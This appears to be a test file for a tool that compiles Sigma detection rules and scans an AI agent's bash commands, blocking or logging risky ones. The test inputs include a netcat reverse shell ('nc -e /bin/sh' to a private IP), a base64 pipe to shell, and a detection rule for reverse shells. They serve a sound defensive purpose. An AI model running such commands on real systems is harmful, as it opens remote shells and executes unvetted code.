import fs from "fs"; import os from "os"; import path from "path";
import { readZip } from "../src/feeds/zip";
import { compileSigma, compileSigmaRule, parseCondition, toPattern } from "../src/feeds/adapters/sigma";
import { scanCommand, commandContext, evalCondition, setupCommandsFeed } from "../src/feeds/commands";
import { FeedStore } from "../src/feeds/store";
import { stats } from "../src/security-status";

const ZIP = fs.readFileSync(path.join(__dirname, "fixtures", "sigma-sample.zip"));
const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), "blitz-cmd-"));

describe("zip reader", () => {
  test("lists entries and inflates deflate data", () => {
    const entries = readZip(ZIP);
    expect(entries.map((e) => e.name)).toEqual(expect.arrayContaining(["rules/linux/process_creation/proc_creation_lnx_netcat_reverse_shell.yml", "rules/windows/process_creation/win_ignored.yml"]));
    const nc = entries.find((e) => e.name.includes("netcat"))!;
    expect(nc.data().toString("utf-8")).toContain("title:");
    expect(nc.data().length).toBe(nc.size);
    expect(() => readZip(Buffer.from("nope"))).toThrow(/not a zip/);
  });
});

describe("sigma adapter", () => {
  test("values → patterns: wildcards, modifiers, case", () => {
    expect(toPattern("a*b?c.d", ["contains"])).toEqual({ source: "a.*b.c\\.d", flags: "i" });
    expect(toPattern("/nc", ["endswith"])).toEqual({ source: "/nc$", flags: "i" });
    expect(toPattern("x", ["startswith", "cased"])).toEqual({ source: "^x", flags: "" });
    expect(toPattern("^a+$", ["re"])).toEqual({ source: "^a+$", flags: "i" });
    expect(toPattern("exact", [])).toEqual({ source: "^exact$", flags: "i" });
  });
  test("conditions: names, N of glob, and/or/not, parentheses; unsupported counts rejected", () => {
    expect(parseCondition("selection")).toEqual({ t: "sel", name: "selection" });
    expect(parseCondition("all of selection_*")).toEqual({ t: "of", count: "all", glob: "selection_*" });
    expect(parseCondition("selection and not 1 of filter_main_*")).toEqual({ t: "and", a: { t: "sel", name: "selection" }, b: { t: "not", a: { t: "of", count: 1, glob: "filter_main_*" } } });
    expect(parseCondition("(a and b) or c").t).toBe("or");
    expect(parseCondition("1 of them")).toEqual({ t: "of", count: 1, glob: "*" });
    expect(() => parseCondition("2 of selection_*")).toThrow(/unsupported count/);
  });
  test("compiles the sample bundle: linux/macos only, unsupported rules counted, windows ignored", () => {
    const c = compileSigma(ZIP);
    expect(c.rules.map((r) => r.meta?.file)).not.toEqual(expect.arrayContaining([expect.stringContaining("windows")]));
    expect(c.rules.some((r) => r.description.startsWith("Potential Netcat Reverse Shell"))).toBe(true);
    expect(c.skipped.length).toBe(1);
    expect(c.skipped[0].reason).toMatch(/process context/);
    const filterRule = c.rules.find((r) => r.id === "f1")!; // negated unsupported filter is allowed
    expect(filterRule.sigma!.selections.filter_main_apt).toBeNull();
    expect(compileSigmaRule("title: x\nid: y\ndetection:\n  sel:\n    CommandLine|base64offset|contains: 'a'\n  condition: sel\n", "f").skip).toMatch(/process context/);
    expect(compileSigmaRule("title: x\nid: y\ndetection:\n  sel:\n    CommandLine|contains: 'a'\n  condition: nope\n", "f").skip).toMatch(/unknown selection/);
    expect(() => compileSigma(Buffer.from("PK\x05\x06" + "\0".repeat(18)))).toThrow(/no rules/);
  });
});

describe("command evaluation", () => {
  const rules = compileSigma(ZIP).rules;
  test("images: first token of every simple command, bare names get a leading slash", () => {
    expect(commandContext("sudo /usr/bin/nc -e /bin/sh h 1 && ls | grep x; FOO=1 wget u").images).toEqual(["/usr/bin/nc", "/ls", "/grep", "/wget"]);
  });
  test("reverse shell and base64 pipe hit; ordinary commands do not; `all of` requires every selection", () => {
    expect(scanCommand("nc -e /bin/sh 10.0.0.1 4444", rules).map((h) => h.title)).toEqual(["Potential Netcat Reverse Shell Execution"]);
    expect(scanCommand("nc -zv host 80", rules)).toEqual([]); // flags selection not met
    expect(scanCommand("echo aGk= | base64 -d | sh", rules).map((h) => h.title)).toEqual(["Linux Base64 Encoded Pipe to Shell"]);
    for (const c of ["bun test && git status", "ls -la", "curl https://example.com", "cat /etc/hosts"]) expect(scanCommand(c, rules)).toEqual([]);
  });
  test("a `not filter` that needs unsupported context evaluates as no filter (documented: more hits, never fewer)", () => {
    expect(scanCommand("wget http://x/y", rules).map((h) => h.id)).toContain("f1");
    const r = rules.find((r) => r.id === "f1")!;
    expect(evalCondition(r.sigma!.condition, r.sigma!.selections, commandContext("curl x"))).toBe(false);
  });
});

describe("commands feed hook", () => {
  const fetchZip: any = async () => new Response(ZIP, { status: 200 });
  async function harness(mode: "enforce" | "monitor" | "off", installed = true) {
    const store = new FeedStore(tmp(), fetchZip);
    if (installed) { store.optIn(); const ev = await store.update("commands"); if (ev.type !== "feed_update") throw new Error(JSON.stringify(ev)); }
    const handlers: Record<string, any> = {}; const pi: any = { on: (n: string, h: any) => { handlers[n] = h; } };
    const logged: any[] = []; const notes: string[] = [];
    setupCommandsFeed(pi, { feeds: { commands: mode } } as any, { log: (e: any) => logged.push(e) } as any, store);
    return { fire: (command: string) => handlers.tool_call?.({ toolName: "bash", input: { command } }, { hasUI: true, ui: { notify: (m: string) => notes.push(m) } }), registered: !!handlers.tool_call, logged, notes, store };
  }
  beforeEach(() => { stats.feeds.commands = 0; stats.blocked.feed = 0; });
  test("store round-trips a binary feed; monitor records + shows; enforce blocks; off/absent inactive", async () => {
    const h = await harness("monitor");
    expect(h.store.manifest("commands")).toMatchObject({ rules: 3, skipped: 1 });
    expect(await h.fire("nc -e /bin/sh 10.0.0.1 4444")).toBeUndefined();
    expect(h.logged[0]).toMatchObject({ type: "feed_command", mode: "monitor", allowed: true, hits: [expect.objectContaining({ title: "Potential Netcat Reverse Shell Execution" })] });
    expect(h.notes[0]).toContain("Command shapes (monitor)");
    expect(stats.feeds.commands).toBe(1);
    expect(await h.fire("ls")).toBeUndefined(); expect(h.logged).toHaveLength(1);
    const e = await harness("enforce");
    expect(await e.fire("echo aGk= | base64 -d | sh")).toMatchObject({ block: true, reason: expect.stringContaining("Base64") });
    expect(stats.blocked.feed).toBe(1);
    expect((await harness("off")).registered).toBe(false);
    const absent = await harness("monitor", false); // registered, but silent until the feed is installed (live reload)
    expect(absent.registered).toBe(true);
    expect(await absent.fire("nc -e /bin/sh 10.0.0.1 4444 http://203.0.113.9:8080/bin.sh")).toBeUndefined();
    expect(absent.logged).toHaveLength(0);
  });
});
